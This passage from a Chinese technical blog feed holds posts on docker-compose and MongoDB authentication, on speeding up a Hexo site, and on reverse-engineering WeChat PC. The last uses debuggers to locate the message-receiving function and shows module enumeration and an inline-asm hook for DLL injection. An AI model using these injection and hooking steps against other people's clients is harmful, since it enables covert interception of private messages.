class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  nginx:</span></span><br><span class="line"><span class="attr">   container_name:</span> <span class="string">v-nginx</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">   restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">   -</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line"><span class="bullet">   -</span> <span class="number">443</span><span class="string">:443</span></span><br><span class="line"><span class="attr">   volumes:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/spring-website-docker/nginx/conf.d:/etc/nginx/conf.d</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/nginx-log:/var/log/nginx</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">/etc/localtime:/etc/localtime</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">  mysql:</span></span><br><span class="line"><span class="attr">   container_name:</span> <span class="string">mymysql</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">mysql</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="attr">    MYSQL_DATABASE:</span> <span class="string">java_web</span></span><br><span class="line"><span class="attr">    MYSQL_ROOT_PASSWORD:</span> <span class="string">******</span></span><br><span class="line"><span class="attr">    MYSQL_ROOT_HOST:</span> <span class="string">'%'</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"27018:3306"</span></span><br><span class="line"><span class="attr">   volumes:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/spring-website-docker/mysql-entrypoint:/docker-entrypoint-initdb.d</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/create_user_table.sql:/create_user_table.sql</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">/etc/localtime:/etc/localtime</span></span><br><span class="line"><span class="attr">   restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  mongo:</span></span><br><span class="line"><span class="attr">   container_name:</span> <span class="string">mongo</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">mongo</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">MONGO_INITDB_ROOT_USERNAME=root</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">MONGO_INITDB_ROOT_PASSWORD=*******</span></span><br><span class="line"><span class="attr">   volumes:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/mongodb:/data/db</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/mongo-log:/data/log</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/spring-website-docker/mongo-entrypoint:/docker-entrypoint-initdb.d</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">/etc/localtime:/etc/localtime</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">   -</span> <span class="string">"27018:27017"</span></span><br><span class="line"><span class="attr">   restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">   command:</span> <span class="string">mongod</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  spring-blog-website:</span></span><br><span class="line"><span class="attr">    restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">    build:</span> <span class="string">./spring-blog-website</span></span><br><span class="line"><span class="attr">    working_dir:</span> <span class="string">/spring-blog-website</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./spring-blog-website:/spring-blog-website</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">~/.m2:/root/.m2</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">~/upload-dir:/spring-blog-website/upload-dir</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/etc/localtime:/etc/localtime</span></span><br><span class="line"><span class="attr">    expose:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8080"</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">nginx</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">mysql</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">mongo</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">mvn</span> <span class="string">clean</span> <span class="attr">spring-boot:run</span> <span class="bullet">-Dspring-boot.run.profiles=docker</span></span><br></pre></td></tr></table></figure></p><p>简单分析一下上面的文件内容，有两组内容，分别是version和services，services下面包含着所有要打包的应用的名称，也是容易的名称，如果容器是从官网上pull下来的，那么容器名就是pull下来的容器名。<br>像container_name 是自己定义的。有几组映射关系，像ports的映射、volumes的映射，简单将映射简化为&lt;A:B&gt;，A为主机的资源，B为容器内的资源。<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">"27018:3306"</span></span><br></pre></td></tr></table></figure></p><p>这组映射的意思就是把主机的27018端口映射到mymysql容器的3306端口下。<br>而volumes的映射是将磁盘的内容同步映射。有了上面的基本了解，还有一个是command指令，意思是在容器开启之后，自动执行的命令。</p><p>关于docker-compose的部署在文档中写的也很清楚，可以参见<a href="https://yeasy.gitbooks.io/docker_practice/compose/" target="_blank" rel="noopener">docker compose</a>。重点看一下命令说明那块的内容，里面讲的很详细</p><p>下面再说一下docker-compose中如何组织加密MongoDB的部署</p><h3 id="dockercompose中-MongoDB的加密配置"><a href="#dockercompose中-MongoDB的加密配置" class="headerlink" title="dockercompose中 MongoDB的加密配置"></a>dockercompose中 MongoDB的加密配置</h3><p>如果没有docker-compose，我们想要配置一个加密的MongoDB数据库，可以先不加密开启，然后添加一个admin数据库用户，然后再通过admin这个账户创建其他一般数据库的账户。如我在本地开启一个加密的MongoDB的数据库，只需要下面几步内容：</p><ol><li><p>在admin数据库中设置了管理员账户，用来管理其他库<br>db.createUser({ user: “blogweb”, pwd: “password”, roles: [{ role: “userAdminAnyDatabase”, db: “admin” }] i})</p></li><li><p>然后在MongoDB的配置文件中开启安全选项，这一步不做也可以，直接重启MongoDB数据，在重启命令后面加上–auth，然后再添加其他数据库的账号信息</p></li><li><p>添加其他数据库的加密账户，如abcd数据库的账户：<br>db.createUser({ user: “qwerty”, pwd: “password123.”, roles: [{ role: “dbOwner”, db:”abcd” }] })<br>然后就可以使用这个账号登录该数据库了，这个时候设置了admin的账户，即使知道了admin的账户，也进不去java_web的账户，从而提高数据库的安全性。</p></li></ol><p>参考资料：<a href="https://juejin.im/post/5b0519cf518825426539d05e" target="_blank" rel="noopener">https://juejin.im/post/5b0519cf518825426539d05e</a></p><p>但是在docker-compose中，我们是利用docker开启mongo服务的，没有–auth这种命令选项，那么该如何做呢？请看service代码：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mongo:</span></span><br><span class="line"><span class="attr">   container_name:</span> <span class="string">mongo</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">mongo</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">MONGO_INITDB_ROOT_USERNAME=root</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">MONGO_INITDB_ROOT_PASSWORD=*******</span></span><br><span class="line"><span class="attr">   volumes:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/mongodb:/data/db</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/mongo-log:/data/log</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">~/spring-website-docker/mongo-entrypoint:/docker-entrypoint-initdb.d</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">/etc/localtime:/etc/localtime</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">   -</span> <span class="string">"27018:27017"</span></span><br><span class="line"><span class="attr">   restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">   command:</span> <span class="string">mongod</span></span><br></pre></td></tr></table></figure></p><p>即在mongo的environment中添加一个root账户，就不需要手动开启–auth选项了。等待容器开启之后，在command中自动执行脚本mongo.sh，或者手动执行也可以。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mongo.sh</span></span><br><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Creating mongo users..."</span></span><br><span class="line">mongo admin --host localhost -u root -p ******* --<span class="built_in">eval</span> <span class="string">"db.createUser(&#123;user: 'admin', pwd: 'password', roles: [&#123;role: 'userAdminAnyDatabase', db: 'admin'&#125;]&#125;);"</span></span><br><span class="line">mongo admin -u root -p ******* &lt;&lt; EOF</span><br><span class="line">use abcd</span><br><span class="line">db.createUser(&#123;user: <span class="string">'qwerty'</span>, <span class="built_in">pwd</span>: <span class="string">'password123'</span>, roles:[&#123;role:<span class="string">'readWrite'</span>,db:<span class="string">'abcd'</span>&#125;]&#125;)</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Mongo users created."</span></span><br></pre></td></tr></table></figure></p><p>手动执行脚本的时候，docker命令为：<strong>sudo docker exec -it 容器名或者是容器ID /bin/bash</strong>。<br>在上述执行的时候，可能会出现<strong>message: ‘Authentication failed.’, mongo-express_1  |   ok: 0,</strong>，类似的问题，这个时候不要怀疑是你的root账户没有生效，是因为你的volume中，有以前未加密的数据库文件，就导致了这个错误。这个时候只需要使用rm -r清空你的mongodb数据库的存储文件即可，或者docker-compose启动时加上下面的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up --force-recreate --renew-anon-volumes</span><br></pre></td></tr></table></figure><p>参考资料</p><ul><li><a href="https://stackoverflow.com/questions/53509236/mongo-authentication-inside-docker" target="_blank" rel="noopener">Mongo authentication inside Docker</a></li></ul><h3 id="谈一谈docker的使用、项目的部署等"><a href="#谈一谈docker的使用、项目的部署等" class="headerlink" title="谈一谈docker的使用、项目的部署等"></a>谈一谈docker的使用、项目的部署等</h3><p>在之前的一篇文章中，我提到了能不能把整个项目打包成一个容器，在后续的测试、版本更新的过程中，我有了一些新的体会。<br>比如在该项目中，MongoDB和MySQL数据库容器都已经配置完毕，里面已经存有一些数据，但是我要是想更新我的项目代码，在之前的那种想法中，数据库会重新初始化，里面的数据也就不在了，这在实际的生产中明显是不可行的。现在的这种方式，利用docker-compose部署完项目后，假如我的spring boot项目的代码进行了修改，要重新部署，只需要将对应的代码传到服务器中项目的位置，其他的配置都不需要改变，还是相当方便的，还不知道公司里面发布代码是怎么个流程，如果有小伙伴在公司上班，还请告知一二。</p><p>那是不是第一种想法在现实中就没有应用呢？当然不是，wiznote就是个案例，wiznote在官网上提供了一个2g左右大小的docker容器，只需要一键即可将其部署到自己的服务器上，实现自己的服务，还是相当不错的，只不过是占用的内存稍多了些。这个容器就是将所有的组件打包到一个容器中，实现一键部署。如果你的代码很稳定，不需要改变，那么可以使用这种方式。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga9vh7uw9mj30y00d6t9q.jpg" alt="Screen Shot 2019-12-26 at 09.34.50"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这篇文章讲一讲将项目容器化的实践，主要内容包括以下几个方面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;docker-compose部署spring boot项目&lt;/li&gt;
&lt;li&gt;docker MongoDB的加密配置&lt;/li&gt;
&lt;li&gt;谈一谈docker的使用、项目的部署等&lt;/li&gt;

      
    
    </summary>
    
      <category term="docker" scheme="http://yoursite.com/categories/docker/"/>
    
      <category term="Java" scheme="http://yoursite.com/categories/docker/Java/"/>
    
    
      <category term="spring boot" scheme="http://yoursite.com/tags/spring-boot/"/>
    
      <category term="docker-compose" scheme="http://yoursite.com/tags/docker-compose/"/>
    
      <category term="网站运维" scheme="http://yoursite.com/tags/%E7%BD%91%E7%AB%99%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>优化hexo博客的访问速度</title>
    <link href="http://yoursite.com/2019/12/16/%E4%BC%98%E5%8C%96hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/"/>
    <id>http://yoursite.com/2019/12/16/优化hexo博客的访问速度/</id>
    <published>2019-12-16T02:53:38.717Z</published>
    <updated>2019-12-16T03:19:07.452Z</updated>
    
    <content type="html"><![CDATA[<p>既然写到了这个，就简单说一下为什么把博客迁移到hexo。我的博客之前是直接使用了WordPress，托管在腾讯云上，当时自己的安全意识比较浅薄，数据库密码设置很简单，同时也是因为有侥幸意识，觉得我这么一个小站点应该没有什么人会去搞，数据库直接开放外部连接，密码设为passwd，也没有进行数据库备份的操作，然后就被人撞库，直接把整个数据库给删了。这都是通过查看服务器登录的日志看到的，当时网站崩溃，上去看了一下日志信息，幸好还配置了保存正常登录的日志信息，就在access.log中看到了一个未知的来自东北的IP地址不断地尝试登录数据库，在某个时刻登陆成功，就明白了被人撞库了。上面积累了一年多的博客文章也都没有了，主要是WordPress提供后台直接编辑的功能，在本地也没有留下文章的备份，这个是被删库的最难受的地方，毕竟记录着自己的技术成长历程。<br>之后就了解到hexo，觉得hexo主题也很多，界面也很美观，博客也只是托管到github上，通过本地写好之后，生成部署即可，感觉用着不错。也不用担心服务器到期要更换、文章丢失的问题。目前该博客使用的主题是<strong>cactus</strong>，相信很多使用过hexo的同学都遇到过加载过慢的问题。上周自己终于忍无可忍，决心优化一下这个问题。当时自己就在想，自己明明使用github的时候，网页的加载速度并不是很慢（当然也没有多快），怎么加载个page页面会这么慢呢。</p><p>下面就是优化的思路。想要解决为什么加载慢，大家都知道github服务器在境外，所以加载速度过慢，这个也是根本原因，所以很多同学就将hexo博客部署到自己的国内服务器，或者通过一些CDN进行加载，我觉得都太麻烦了，年纪大了，懒得折腾了。就打开了控制台看了一下：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9yea89xtxj31nf0u0nau.jpg" alt="Screen Shot 2019-12-16 at 11.10.20"></p><p>相信大家看到这里就明白了，网站加载的之所以慢，主要是因为加载了一个300k的logo，以及一个800k的字体。这些占用了大量的时间进行加载。对于大一点的logo，我选择将其上传到一些 免费图床，我现在使用的图床软件iPic用着还不错。<br>字体的话，如果自己有服务器的话，可以开一个服务，然后加载一下，如果没有的话，在hexo主题的源码中，找到字体加载的地方删除即可。这个优化的方式都比较简单，但是也有效的提高了博客的访问速度。、</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;既然写到了这个，就简单说一下为什么把博客迁移到hexo。我的博客之前是直接使用了WordPress，托管在腾讯云上，当时自己的安全意识比较浅薄，数据库密码设置很简单，同时也是因为有侥幸意识，觉得我这么一个小站点应该没有什么人会去搞，数据库直接开放外部连接，密码设为passw
      
    
    </summary>
    
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>微信PC逆向：接收消息(一)</title>
    <link href="http://yoursite.com/2019/12/16/%E5%BE%AE%E4%BF%A1%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/"/>
    <id>http://yoursite.com/2019/12/16/微信消息发送与接收/</id>
    <published>2019-12-16T01:53:16.351Z</published>
    <updated>2019-12-18T03:19:36.474Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章主要分析一下微信消息接收与发送的一些相关内容。我会首先把微信消息的发送和接收的技术要点和一些概念罗列一下，好让大家有个大致的概念。最后会再絮叨一下淘宝联盟。</p><h2 id="0x01微信自动化的3种方式"><a href="#0x01微信自动化的3种方式" class="headerlink" title="0x01微信自动化的3种方式"></a>0x01微信自动化的3种方式</h2><p>目前为止自动化处理微信消息的方式主要有三种方式。</p><ol><li>利用web协议</li><li>利用微信iPad协议</li><li>客户端逆向处理</li></ol><p>首先说一下web协议，相比大家都了解或使用过python的itchat库。A complete and graceful API for Wechat. 微信个人号接口、微信机器人及命令行微信，三十行即可自定义个人号机器人，这是这个github库的介绍。这个库主要是利用了网页版本的微信提供的api接口。但是随着微信官方的逐步封禁，目前只有很少一部分人可以正常使用网页版微信。大家可以自行登录<a href="https://wx.qq.com/" target="_blank" rel="noopener">https://wx.qq.com/</a> 查看自己是否还能登录网页版微信。<br>如果登录后显示 1203 错误代码，或者出现下面这个提示信息，都是网页版本不能使用的：</p><blockquote><p>为了你的帐号安全，此微信号不能登录网页微信。你可以使用Windows微信或Mac微信在电脑端登录。Windows微信下载地址：<a href="https://pc.weixin.qq.com" target="_blank" rel="noopener">https://pc.weixin.qq.com</a>  Mac微信下载地址：<a href="https://mac.weixin.qq.com" target="_blank" rel="noopener">https://mac.weixin.qq.com</a> </p></blockquote><p>查询了一下，网上关于 微信网页版的猜测主要是 第一步新注册用户不可以登录网页版微信，之后逐步封禁17年之前注册的，但是超过一段时间没有使用过网页版微信的用户。所以现在想要通过itchat制作一个微信机器人的想法就破灭了，只能寻求其他的方案。</p><p>再来说一下第2种方式，利用iPad协议来实现微信消息的自动收发，pass</p><p>最终选择了第3种方案，即利用逆向工程来搞定它。<del>这个方案说难也不难，说稳定也不稳定。</del></p><p>为什么说微信逆向说难也难，说稳定也不稳定呢。这个可能也是是逆向工程的特点，因为是对内存地址进行直接操作，因此如果编译之前的源代码的数据结构或代码结构发生改变，那么汇编代码的结构就会相应的发生改变，同时导致一些函数地址不确定。但是一旦思路确定，所做的工作就是不断的调试分析。下面就主要说说微信消息的接收和发送。</p><h2 id="0x02微信的一些基本概念"><a href="#0x02微信的一些基本概念" class="headerlink" title="0x02微信的一些基本概念"></a>0x02微信的一些基本概念</h2><ol><li><p>微信ID<br>刚注册的一个微信，有系统配置的一个wx_id号，大家应该都记得，一旦修改了微信号，那么显示的微信号就变成了你自己设置的那个微信号，但是在微信系统内部，依然保留着这个wx_id，这个wx_id和你的微信号保持着一一对应的关系。这个做一个简单的了解即可。</p></li><li><p>微信消息<br>微信消息分为3种消息——个人消息、群消息以及公众号（企业号）消息。这3种消息数据在内存中的位置稍有差别，我们这里先只关注个人消息。不知道大家有没有注意过PC版本的微信收到消息时，会将最新的消息置顶（不包括认为置顶消息），即未读消息会按照到达时间进行排序，这将成为我们进行消息接收的利用点。因为最新的消息都在最上面，那么我们就只需要找到这个位置的消息即可实现消息的接收。</p></li><li><p>个人微信消息的类型<br>微信消息的类型有多种，如文本、语音、图片、视频、红包等等，这个消息的类型还是很复杂的，本文也只关注文本消息。在查找到的资料中，得到了微信消息类型的代码如下，该代码位于 [[esp]]+0x30 的位置：</p><blockquote><p>[01文字] [03图片] [31转账XML信息] [22语音消息] [02B视频信息]</p></blockquote></li></ol><h2 id="0x03微信消息的接收"><a href="#0x03微信消息的接收" class="headerlink" title="0x03微信消息的接收"></a>0x03微信消息的接收</h2><p>借鉴了大佬的思路，通过CE和OllDbg来寻找微信消息等信息的地址。主要思路为：</p><ol><li>首先利用CE搜寻消息的地址，使用OD附加WeChat.exe进程，然后在消息存储的地方下<strong>内存写入断点</strong>；</li><li>按F9运行OD，再使用另一个微信2给处于调试中的微信1发送一条消息，这个时候程序会在断点处停下，即进入准备处理消息的状态，此时堆栈返回地址中必定会有一个函数是用来接收消息的；</li><li>点击 K 查看调用堆栈，在堆栈中通过栈回溯方法寻找该函数的地址，在该函数地址处下断点，按F9运行；</li><li>这个时候查看esp的值，并点击follow in dump，追踪[[esp]]前后的数据；</li><li>通过查看[[esp]]前后的数据，可以看到我们发送的消息以及发送者的微信wx_id</li></ol><p>下面将详细说明上面每一条思路的具体操作</p><h3 id="1、利用CE搜索消息地址"><a href="#1、利用CE搜索消息地址" class="headerlink" title="1、利用CE搜索消息地址"></a>1、利用CE搜索消息地址</h3><p>CE可以根据字符串来寻找此时字符串所在的内存地址，在CE中字符串类型选择字串。使用另一个微信给该微信发送一个字符串，在CE中进行搜索将得到许多包含该字符串的地址；再重复一两次该操作，最终包含该字符串的地址将被缩减到两三个，然后选中放到下面区域，全选之后，右键【更改记录-&gt;类型】，长度改为30或40均可，就是让这个地址的字符串显示<br>的多一些，然后可以看到另外两个为空，或者有一些乱码(多重复几次)，只有一个地址的字符串始终包含着《 msg source》。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9zr7hgbstj31fg0rcjzl.jpg" alt="CE寻找字符串"><br>记下那个包含《msg source》的地址，那个地址就是未被处理过的字符串所在的地址，接下来微信消息处理函数将处理这个地方的字符串。</p><h3 id="2、-在OD中寻找接收函数的地址"><a href="#2、-在OD中寻找接收函数的地址" class="headerlink" title="2、 在OD中寻找接收函数的地址"></a>2、 在OD中寻找接收函数的地址</h3><p>关闭CE，使用OD附加WeChat.exe进程，然后Ctrl+G跳转到刚才的那个地址，设内存写入断点，F9运行，使用另一个微信给该微信发送一条消息，微信将停止在该消息的地方，然后点击【K】，然后查看堆栈情况，这个时候堆栈中肯定会有一个函数的返回地址是消息的接收处理函数的地址。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9zrxm1druj31ew0u0tx1.jpg" alt="消息处理函数的地址"></p><h3 id="3、在接收函数附近，寻找消息存放的地址"><a href="#3、在接收函数附近，寻找消息存放的地址" class="headerlink" title="3、在接收函数附近，寻找消息存放的地址"></a>3、在接收函数附近，寻找消息存放的地址</h3><p>上面已经找到了该处理函数，既然我们得到了该函数要处理的地址，那么假如我们将断点设在处理函数这里，微信在处理函数的时候，就会将需要的参数压入到栈中，我们就可以利用esp或者ebp来找到这个时候的消息地址，从而找到偏移地址，因为上面找到的地址全是绝对地址，每一次微信加载到内存中的基址都会发生改变，因此重点是找到消息地址于基址的偏移地址。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9zs4kpftyj31c00u01iy.jpg" alt="微信消息的偏移地址"></p><p>在上一步找到的函数的地址下断点，再发送一条消息，然后这个时候查看栈顶的值，然后选择数据追踪，在数据窗口翻一翻，就可以看到这个微信号刚才发送的消息以及这个微信号的微信wx_id。我们观察一下这个消息所在的地址，可以看到这个地址始终是在 [[esp]]+0x40的位置，除此之外，消息的地址在[[esp]]+0x68的位置。多重复几次上面几步操作，我们得到的结果都是一样，说明我们成功找到了该消息的偏移地址。</p><p>之后我们在进行dll注入的时候，hook该函数，然后计算[[esp]]+0x40和[[esp]]+0x68处的内容即可，这样我们就可以成功得到给我们发送消息的微信id以及消息的内容。</p><h3 id="4、DLL注入代码"><a href="#4、DLL注入代码" class="headerlink" title="4、DLL注入代码"></a>4、DLL注入代码</h3><p>dll注入的方式有好几种，根据需要这里是利用线程注入的方式把我们的dll注入到微信的进程中。我们看一下下图，下图中显示了WeChat加载到内存中加载的WeChat自有的DLL模块。其中有一个dll模块我们可以关注一下，<strong>“WeChatWin.dll”</strong>，这个模块其实就包含着微信进行通信的一些核心功能，包括发送消息，接收消息、发送接收红包等功能。我们要hook某个函数，就需要找到这个函数的偏移地址。</p><p>其中HOOK 公式=WeChatWin.dll的基址+功能函数的偏移地址。基址在每次加载的时候都会改变，但是偏移地址一般不会改变。现在就可以利用WeChatWin.dll的基址和上面我们已经找到了接收消息函数的地址来计算接收消息函数的偏移地址。</p><p>通过CE或者OD都可以查看此时WeChatWin.dll，我们现在已经用OD附加了WeChat.exe进程，点击[L]即可查看加载的dll信息，这里我们看到WeChatWin.dll加载的地址是 0x6B430000，函数的地址为：0x6B735758，那么计算得到的功能函数的偏移地址为：0x6B735758-0x6B430000=0x305758。<br><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga0n40gfn9j30ui08egq2.jpg" alt="WeChatWin.dll的地址"></p><p>现在我们已经确定了函数的偏移地址，每次登陆微信，微信加载dll的地址都会变化，如果使用静态地址显然是不行的，利用Windows提供的CreateToolhelp32Snapshot和Module32First函数可以得到dll的基址信息。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hModuleSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">MODULEENTRY32 me32;</span><br><span class="line">hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID );</span><br><span class="line">me32.dwSize = <span class="keyword">sizeof</span>( MODULEENTRY32 );</span><br><span class="line"><span class="keyword">if</span>( !Module32First( hModuleSnap, &amp;me32 ) )&#123;</span><br><span class="line">  printError( <span class="string">"Module32First"</span> ); <span class="comment">// Show cause of failure</span></span><br><span class="line">  CloseHandle( hModuleSnap );    <span class="comment">// Must clean up the</span></span><br><span class="line">  <span class="keyword">return</span>( FALSE );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>( <span class="string">"\n\n     MODULE NAME:     %s"</span>, me32.szModule );</span><br><span class="line">  <span class="built_in">printf</span>( <span class="string">"\n     base address   = 0x%08X"</span>, (DWORD) me32.modBaseAddr );</span><br><span class="line">&#125; <span class="keyword">while</span>( Module32Next( hModuleSnap, &amp;me32 ) );</span><br><span class="line">CloseHandle( hModuleSnap );</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) VOID RecieveMsgHook()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ecx, 0x10CDCFE8</span><br><span class="line">//提取esp寄存器内容，放在一个变量中</span><br><span class="line">mov r_esp, esp</span><br><span class="line">pushad</span><br><span class="line">pushf</span><br><span class="line">&#125;</span><br><span class="line">RecieveMsg();</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">popf</span><br><span class="line">popad</span><br><span class="line">jmp jumBackAddress</span><br><span class="line">&#125;</span><br><span 